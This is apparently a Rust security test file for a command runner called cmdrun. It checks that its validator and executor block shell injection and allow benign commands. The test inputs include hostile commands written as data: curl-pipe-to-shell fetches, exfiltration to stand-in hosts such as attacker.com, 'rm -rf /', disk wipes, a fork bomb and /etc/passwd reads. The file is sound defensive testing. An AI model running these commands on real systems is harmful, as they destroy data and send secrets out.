//! セキュリティテスト：コマンドインジェクション対策検証
//!
//! 危険なコマンドパターンが適切にブロックされることを確認

use cmdrun::security::CommandValidator;

#[cfg(test)]
mod injection_tests {
    use super::*;

    /// 基本的なコマンドインジェクション攻撃パターン
    #[test]
    fn test_command_injection_semicolon() {
        let validator = CommandValidator::new();

        // セミコロンによるコマンド連結
        let dangerous_commands = vec![
            "ls; rm -rf /",
            "echo hello; cat /etc/passwd",
            "whoami; curl malicious.com/shell.sh | sh",
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Command should be rejected: {}", cmd);
        }
    }

    #[test]
    fn test_command_injection_pipe() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec![
            "cat secret.txt | curl -X POST https://attacker.com",
            "ls -la | sh",
            "echo data | base64 | sh",
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Command should be rejected: {}", cmd);
        }
    }

    #[test]
    fn test_command_injection_substitution() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec!["echo $(whoami)", "echo `cat /etc/passwd`", "ls $(ls -la /)"];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Command substitution should be rejected: {}",
                cmd
            );
        }
    }

    #[test]
    fn test_command_injection_redirect() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec![
            "echo malicious > /etc/passwd",
            "cat /dev/zero > /dev/sda",
            "echo data >> /etc/hosts",
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Dangerous redirect should be rejected: {}",
                cmd
            );
        }
    }

    /// システム破壊コマンド
    #[test]
    fn test_dangerous_system_commands() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec![
            "rm -rf /",
            "dd if=/dev/zero of=/dev/sda",
            "mkfs.ext4 /dev/sda1",
            "format c:",
            ":(){:|:&};:", // フォークボム
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Dangerous system command should be rejected: {}",
                cmd
            );
        }
    }

    /// 権限昇格・システム操作
    #[test]
    fn test_privilege_escalation() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec![
            "sudo rm -rf /",
            "su root",
            "chmod 777 /etc/passwd",
            "chown root:root /tmp/malicious",
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Privilege escalation command should be rejected: {}",
                cmd
            );
        }
    }

    /// 悪意のあるコード実行
    #[test]
    fn test_code_execution() {
        let validator = CommandValidator::new();

        let dangerous_commands = vec![
            "eval 'malicious code'",
            "exec sh -c 'rm -rf /'",
            "sh -c 'cat /etc/passwd'",
        ];

        for cmd in dangerous_commands {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Code execution command should be rejected: {}",
                cmd
            );
        }
    }

    /// ヌルバイト攻撃
    #[test]
    fn test_null_byte_injection() {
        let validator = CommandValidator::new();

        let cmd = "echo hello\0world";
        let result = validator.validate(cmd);
        assert!(!result.is_safe(), "Null byte should be rejected");
    }

    /// 長すぎるコマンド（DoS攻撃）
    #[test]
    fn test_command_length_limit() {
        let validator = CommandValidator::new().with_max_length(100);

        let long_cmd = "echo ".to_string() + &"A".repeat(200);
        let result = validator.validate(&long_cmd);
        assert!(
            !result.is_safe(),
            "Excessively long command should be rejected"
        );
    }

    /// 安全なコマンドは許可される
    #[test]
    fn test_safe_commands_allowed() {
        let validator = CommandValidator::new();

        let safe_commands = vec![
            "echo hello world",
            "ls -la",
            "cargo build",
            "npm install",
            "python script.py",
            "git status",
        ];

        for cmd in safe_commands {
            let result = validator.validate(cmd);
            assert!(result.is_safe(), "Safe command should be allowed: {}", cmd);
        }
    }

    /// 非厳格モード：パイプとリダイレクトが許可される
    #[test]
    fn test_non_strict_mode_allows_pipes() {
        let validator = CommandValidator::new()
            .with_strict_mode(false)
            .allow_pipe()
            .allow_redirect();

        let commands = vec![
            "ls -la | grep test",
            "echo hello > output.txt",
            "cat input.txt | sort | uniq",
        ];

        for cmd in commands {
            let result = validator.validate(cmd);
            assert!(
                result.is_safe(),
                "Command should be allowed in non-strict mode: {}",
                cmd
            );
        }
    }

    /// 変数展開許可モード
    #[test]
    fn test_variable_expansion_allowed() {
        let validator = CommandValidator::new()
            .allow_variable_expansion()
            .with_strict_mode(false);

        let commands = vec!["echo $HOME", "echo ${USER}", "ls ${PWD}"];

        for cmd in commands {
            let result = validator.validate(cmd);
            assert!(
                result.is_safe(),
                "Variable expansion should be allowed: {}",
                cmd
            );
        }
    }

    /// カスタム禁止ワード
    #[test]
    fn test_custom_forbidden_words() {
        let validator = CommandValidator::new()
            .add_forbidden_word("secret_command")
            .add_forbidden_word("internal_api");

        assert!(!validator.validate("run secret_command").is_safe());
        assert!(!validator.validate("call internal_api").is_safe());
        assert!(validator.validate("run normal_command").is_safe());
    }

    /// エッジケース：空コマンド
    #[test]
    fn test_empty_command() {
        let validator = CommandValidator::new();

        let empty_commands = vec!["", "   ", "\t\n"];

        for cmd in empty_commands {
            let result = validator.validate(cmd);
            assert!(!result.is_safe(), "Empty command should be rejected");
        }
    }

    /// 複合攻撃パターン
    #[test]
    fn test_complex_injection_patterns() {
        let validator = CommandValidator::new();

        let complex_attacks = vec![
            "echo 'safe' && rm -rf / #",
            "ls || curl attacker.com | sh",
            "test -f /etc/passwd && cat /etc/passwd",
            "echo hello & background_malicious_process",
        ];

        for cmd in complex_attacks {
            let result = validator.validate(cmd);
            assert!(
                !result.is_safe(),
                "Complex injection should be rejected: {}",
                cmd
            );
        }
    }
}

/// `cmdrun add` コマンド経由での統合テスト
#[cfg(test)]
mod add_command_integration_tests {
    use std::fs;
    use tempfile::NamedTempFile;

    /// 危険なコマンドが `add` コマンドで拒否されることを確認
    #[tokio::test]
    async fn test_add_command_rejects_dangerous_input() {
        use cmdrun::commands::add::handle_add;

        let temp_file = NamedTempFile::new().unwrap();
        let path = temp_file.path().to_path_buf();

        // Create initial TOML structure
        fs::write(&path, "[commands]\n").unwrap();

        // Test: セミコロンによるコマンド連結
        let result = handle_add(
            Some("dangerous1".to_string()),
            Some("echo test; rm -rf /".to_string()),
            Some("Dangerous command".to_string()),
            None,
            None,
            Some(path.clone()),
        )
        .await;

        assert!(
            result.is_err(),
            "Add command should reject semicolon injection"
        );

        // Test: パイプによる危険なコマンド
        let result = handle_add(
            Some("dangerous2".to_string()),
            Some("cat /etc/passwd | curl attacker.com".to_string()),
            Some("Pipe injection".to_string()),
            None,
            None,
            Some(path.clone()),
        )
        .await;

        assert!(result.is_err(), "Add command should reject pipe injection");

        // Test: コマンド置換
        let result = handle_add(
            Some("dangerous3".to_string()),
            Some("echo $(whoami)".to_string()),
            Some("Command substitution".to_string()),
            None,
            None,
            Some(path.clone()),
        )
        .await;

        assert!(
            result.is_err(),
            "Add command should reject command substitution"
        );

        // Test: リダイレクト攻撃
        let result = handle_add(
            Some("dangerous4".to_string()),
            Some("echo malicious > /etc/passwd".to_string()),
            Some("Redirect attack".to_string()),
            None,
            None,
            Some(path.clone()),
        )
        .await;

        assert!(
            result.is_err(),
            "Add command should reject dangerous redirect"
        );

        // Test: 安全なコマンドは許可される
        let result = handle_add(
            Some("safe".to_string()),
            Some("echo hello world".to_string()),
            Some("Safe command".to_string()),
            None,
            None,
            Some(path.clone()),
        )
        .await;

        assert!(result.is_ok(), "Add command should allow safe commands");
    }
}

/// 実際のコマンド実行での統合テスト
#[cfg(test)]
mod integration_tests {
    use ahash::AHashMap;
    use cmdrun::command::executor::{CommandExecutor, ExecutionContext};
    use cmdrun::config::schema::Command;
    use cmdrun::config::CommandSpec;

    /// 危険なコマンドは実行前にブロックされる
    #[tokio::test]
    async fn test_executor_blocks_dangerous_commands() {
        let ctx = ExecutionContext {
            strict: true,
            ..Default::default()
        };
        let executor = CommandExecutor::new(ctx);

        let dangerous_cmd = Command {
            description: "dangerous".to_string(),
            cmd: CommandSpec::Single("echo hello; rm -rf /".to_string()),
            env: AHashMap::new(),
            working_dir: None,
            deps: vec![],
            platform: vec![],
            tags: vec![],
            timeout: None,
            parallel: false,
            confirm: false,
            allow_chaining: None,
            allow_subshells: None,
        };

        let result = executor.execute(&dangerous_cmd).await;
        assert!(result.is_err(), "Dangerous command should be blocked");
    }

    /// 非厳格モードでは一部のメタ文字が許可される
    #[tokio::test]
    async fn test_executor_non_strict_allows_pipes() {
        let ctx = ExecutionContext {
            strict: false,
            ..Default::default()
        };
        let executor = CommandExecutor::new(ctx);

        // プラットフォーム別のパイプコマンド
        #[cfg(windows)]
        let pipe_command = "echo hello | findstr hello";
        #[cfg(not(windows))]
        let pipe_command = "echo hello | cat";

        let pipe_cmd = Command {
            description: "pipe test".to_string(),
            cmd: CommandSpec::Single(pipe_command.to_string()),
            env: AHashMap::new(),
            working_dir: None,
            deps: vec![],
            platform: vec![],
            tags: vec![],
            timeout: None,
            parallel: false,
            confirm: false,
            allow_chaining: None,
            allow_subshells: None,
        };

        let result = executor.execute(&pipe_cmd).await;
        assert!(result.is_ok(), "Pipe should be allowed in non-strict mode");
    }

    /// allow_chaining機能のテスト：階層的制御
    #[tokio::test]
    async fn test_command_chaining_hierarchical_control() {
        use ahash::AHashMap;
        use cmdrun::command::executor::{CommandExecutor, ExecutionContext};
        use cmdrun::config::schema::{Command, CommandSpec};

        // 1. デフォルト（allow_chaining = None, グローバル = false）→ &&は拒否
        let ctx_default = ExecutionContext {
            allow_command_chaining: false,
            allow_subshells: false,
            ..Default::default()
        };
        let executor_default = CommandExecutor::new(ctx_default);

        let cmd_with_and = Command {
            description: "test with &&".to_string(),
            cmd: CommandSpec::Single("echo hello && echo world".to_string()),
            env: AHashMap::new(),
            working_dir: None,
            deps: vec![],
            platform: vec![],
            tags: vec![],
            timeout: None,
            parallel: false,
            confirm: false,
            allow_chaining: None,
            allow_subshells: None, // デフォルト（グローバル設定に従う）
        };

        let result = executor_default.execute(&cmd_with_and).await;
        assert!(
            result.is_err(),
            "Default: && should be rejected when global allow_command_chaining = false"
        );

        // 2. グローバルのみ有効（allow_chaining = None, グローバル = true）→ &&は許可
        let ctx_global_allow = ExecutionContext {
            allow_command_chaining: true,
            allow_subshells: false,
            ..Default::default()
        };
        let executor_global_allow = CommandExecutor::new(ctx_global_allow);

        let result = executor_global_allow.execute(&cmd_with_and).await;
        assert!(
            result.is_ok(),
            "Global allow: && should be allowed when global allow_command_chaining = true"
        );

        // 3. コマンド個別で有効（allow_chaining = Some(true), グローバル = false）→ &&は許可
        let ctx_individual = ExecutionContext {
            allow_command_chaining: false,
            allow_subshells: false,
            ..Default::default()
        };
        let executor_individual = CommandExecutor::new(ctx_individual);

        let cmd_individual_allow = Command {
            description: "individual allow".to_string(),
            cmd: CommandSpec::Single("echo hello && echo world".to_string()),
            env: AHashMap::new(),
            working_dir: None,
            deps: vec![],
            platform: vec![],
            tags: vec![],
            timeout: None,
            parallel: false,
            confirm: false,
            allow_chaining: Some(true), // 個別で許可
            allow_subshells: None,
        };

        let result = executor_individual.execute(&cmd_individual_allow).await;
        assert!(
            result.is_ok(),
            "Individual allow: && should be allowed when command.allow_chaining = Some(true)"
        );

        // 4. コマンド個別で無効（allow_chaining = Some(false), グローバル = true）→ &&は拒否（個別設定が優先）
        let ctx_override = ExecutionContext {
            allow_command_chaining: true,
            allow_subshells: false,
            ..Default::default()
        };
        let executor_override = CommandExecutor::new(ctx_override);

        let cmd_individual_deny = Command {
            description: "individual deny".to_string(),
            cmd: CommandSpec::Single("echo hello && echo world".to_string()),
            env: AHashMap::new(),
            working_dir: None,
            deps: vec![],
            platform: vec![],
            tags: vec![],
            timeout: None,
            parallel: false,
            confirm: false,
            allow_chaining: Some(false), // 個別で拒否（グローバルを上書き）
            allow_subshells: None,
        };

        let result = executor_override.execute(&cmd_individual_deny).await;
        assert!(result.is_err(), "Individual deny: && should be rejected when command.allow_chaining = Some(false) even if global = true");
    }

    /// allow_chaining: セミコロンとパイプも許可されることを確認
    #[tokio::test]
    async fn test_command_chaining_allows_semicolon_and_pipe() {
        use ahash::AHashMap;
        use cmdrun::command::executor::{CommandExecutor, ExecutionContext};
        use cmdrun::config::schema::{Command, CommandSpec};

        let ctx = ExecutionContext {
            allow_command_chaining: true,
            allow_subshells: false,
            ..Default::default()
        };
        let executor = CommandExecutor::new(ctx);

        // セミコロン
        let cmd_semicolon = Command {
            description: "test with ;".to_string(),
            cmd: CommandSpec::Single("echo hello; echo world".to_string()),
            env: AHashMap::new(),
            working_dir: None,
            deps: vec![],
            platform: vec![],
            tags: vec![],
            timeout: None,
            parallel: false,
            confirm: false,
            allow_chaining: None,
            allow_subshells: None,
        };

        let result = executor.execute(&cmd_semicolon).await;
        assert!(
            result.is_ok(),
            "; should be allowed when allow_chaining = true"
        );

        // パイプとAND
        #[cfg(not(windows))]
        let cmd_pipe_and = Command {
            description: "test with | and &&".to_string(),
            cmd: CommandSpec::Single("echo hello | cat && echo done".to_string()),
            env: AHashMap::new(),
            working_dir: None,
            deps: vec![],
            platform: vec![],
            tags: vec![],
            timeout: None,
            parallel: false,
            confirm: false,
            allow_chaining: None,
            allow_subshells: None,
        };

        #[cfg(not(windows))]
        {
            let result = executor.execute(&cmd_pipe_and).await;
            assert!(
                result.is_ok(),
                "| and && should be allowed when allow_chaining = true"
            );
        }
    }

    /// サブシェル制御の階層的テスト
    #[tokio::test]
    async fn test_subshells_hierarchical_control() {
        use ahash::AHashMap;
        use cmdrun::command::executor::{CommandExecutor, ExecutionContext};
        use cmdrun::config::schema::{Command, CommandSpec};

        // ケース1: デフォルト（グローバル: false, コマンド: None） → 拒否
        {
            let ctx = ExecutionContext {
                working_dir: std::path::PathBuf::from("."),
                env: AHashMap::new(),
                shell: "bash".to_string(),
                timeout: Some(10),
                strict: true,
                echo: false,
                color: false,
                language: cmdrun::config::Language::English,
                allow_command_chaining: false,
                allow_subshells: false, // デフォルト: false
            };

            let executor = CommandExecutor::new(ctx);
            let cmd = Command {
                description: "test".to_string(),
                cmd: CommandSpec::Single("(echo test)".to_string()),
                env: AHashMap::new(),
                working_dir: None,
                deps: vec![],
                platform: vec![],
                tags: vec![],
                timeout: None,
                parallel: false,
                confirm: false,
                allow_chaining: None,
                allow_subshells: None, // コマンド個別設定なし → グローバルに従う
            };

            let result = executor.execute(&cmd).await;
            assert!(result.is_err(), "Subshells should be rejected by default");
        }

        // ケース2: グローバル許可（グローバル: true, コマンド: None） → 許可
        #[cfg(not(windows))]
        {
            let ctx = ExecutionContext {
                working_dir: std::path::PathBuf::from("."),
                env: AHashMap::new(),
                shell: "bash".to_string(),
                timeout: Some(10),
                strict: true,
                echo: false,
                color: false,
                language: cmdrun::config::Language::English,
                allow_command_chaining: false,
                allow_subshells: true, // グローバル許可
            };

            let executor = CommandExecutor::new(ctx);
            let cmd = Command {
                description: "test".to_string(),
                cmd: CommandSpec::Single("(echo test)".to_string()),
                env: AHashMap::new(),
                working_dir: None,
                deps: vec![],
                platform: vec![],
                tags: vec![],
                timeout: None,
                parallel: false,
                confirm: false,
                allow_chaining: None,
                allow_subshells: None, // コマンド個別設定なし → グローバルに従う
            };

            let result = executor.execute(&cmd).await;
            assert!(
                result.is_ok(),
                "Subshells should be allowed when global allow_subshells = true"
            );
        }

        // ケース3: コマンド個別許可（グローバル: false, コマンド: Some(true)） → 許可
        #[cfg(not(windows))]
        {
            let ctx = ExecutionContext {
                working_dir: std::path::PathBuf::from("."),
                env: AHashMap::new(),
                shell: "bash".to_string(),
                timeout: Some(10),
                strict: true,
                echo: false,
                color: false,
                language: cmdrun::config::Language::English,
                allow_command_chaining: false,
                allow_subshells: false, // グローバル: 拒否
            };

            let executor = CommandExecutor::new(ctx);
            let cmd = Command {
                description: "test".to_string(),
                cmd: CommandSpec::Single("(echo test)".to_string()),
                env: AHashMap::new(),
                working_dir: None,
                deps: vec![],
                platform: vec![],
                tags: vec![],
                timeout: None,
                parallel: false,
                confirm: false,
                allow_chaining: None,
                allow_subshells: Some(true), // コマンド個別で許可 → グローバルを上書き
            };

            let result = executor.execute(&cmd).await;
            assert!(
                result.is_ok(),
                "Command-level allow_subshells should override global setting"
            );
        }

        // ケース4: コマンド個別拒否（グローバル: true, コマンド: Some(false)） → 拒否
        {
            let ctx = ExecutionContext {
                working_dir: std::path::PathBuf::from("."),
                env: AHashMap::new(),
                shell: "bash".to_string(),
                timeout: Some(10),
                strict: true,
                echo: false,
                color: false,
                language: cmdrun::config::Language::English,
                allow_command_chaining: false,
                allow_subshells: true, // グローバル: 許可
            };

            let executor = CommandExecutor::new(ctx);
            let cmd = Command {
                description: "test".to_string(),
                cmd: CommandSpec::Single("(echo test)".to_string()),
                env: AHashMap::new(),
                working_dir: None,
                deps: vec![],
                platform: vec![],
                tags: vec![],
                timeout: None,
                parallel: false,
                confirm: false,
                allow_chaining: None,
                allow_subshells: Some(false), // コマンド個別で拒否 → グローバルを上書き
            };

            let result = executor.execute(&cmd).await;
            assert!(
                result.is_err(),
                "Command-level allow_subshells = false should override global setting"
            );
        }
    }

    /// grep正規表現パターンのテスト（実際のユースケース）
    #[tokio::test]
    async fn test_grep_regex_pattern_with_subshells() {
        #[cfg(not(windows))]
        {
            use ahash::AHashMap;
            use cmdrun::command::executor::{CommandExecutor, ExecutionContext};
            use cmdrun::config::schema::{Command, CommandSpec};

            let ctx = ExecutionContext {
                working_dir: std::path::PathBuf::from("."),
                env: AHashMap::new(),
                shell: "bash".to_string(),
                timeout: Some(10),
                strict: true,
                echo: false,
                color: false,
                language: cmdrun::config::Language::English,
                allow_command_chaining: false,
                allow_subshells: true, // サブシェル許可（grep正規表現で必要）
            };
            let executor = CommandExecutor::new(ctx);

            // grep -E '(pattern1|pattern2)' のパターン
            let cmd = Command {
                description: "grep with regex".to_string(),
                cmd: CommandSpec::Single(
                    "echo -e 'test\\ndata' | grep -E '(test|data)'".to_string(),
                ),
                env: AHashMap::new(),
                working_dir: None,
                deps: vec![],
                platform: vec![],
                tags: vec![],
                timeout: None,
                parallel: false,
                confirm: false,
                allow_chaining: None,
                allow_subshells: Some(true), // サブシェル許可
            };

            let result = executor.execute(&cmd).await;
            assert!(
                result.is_ok(),
                "grep -E with parentheses should work when allow_subshells = true"
            );
        }
    }

    /// エスケープシーケンスのテスト
    #[tokio::test]
    async fn test_escape_sequences_allowed() {
        #[cfg(not(windows))]
        {
            use ahash::AHashMap;
            use cmdrun::command::executor::{CommandExecutor, ExecutionContext};
            use cmdrun::config::schema::{Command, CommandSpec};

            let ctx = ExecutionContext {
                working_dir: std::path::PathBuf::from("."),
                env: AHashMap::new(),
                shell: "bash".to_string(),
                timeout: Some(10),
                strict: true,
                echo: false,
                color: false,
                language: cmdrun::config::Language::English,
                allow_command_chaining: false,
                allow_subshells: false,
            };
            let executor = CommandExecutor::new(ctx);

            // エスケープシーケンス（\n, \t）を含むコマンド
            let cmd = Command {
                description: "test".to_string(),
                cmd: CommandSpec::Single("echo -e 'line1\\nline2\\ttab'".to_string()),
                env: AHashMap::new(),
                working_dir: None,
                deps: vec![],
                platform: vec![],
                tags: vec![],
                timeout: None,
                parallel: false,
                confirm: false,
                allow_chaining: None,
                allow_subshells: None,
            };

            let result = executor.execute(&cmd).await;
            assert!(
                result.is_ok(),
                "Escape sequences (\\n, \\t) should be allowed"
            );
        }
    }
}
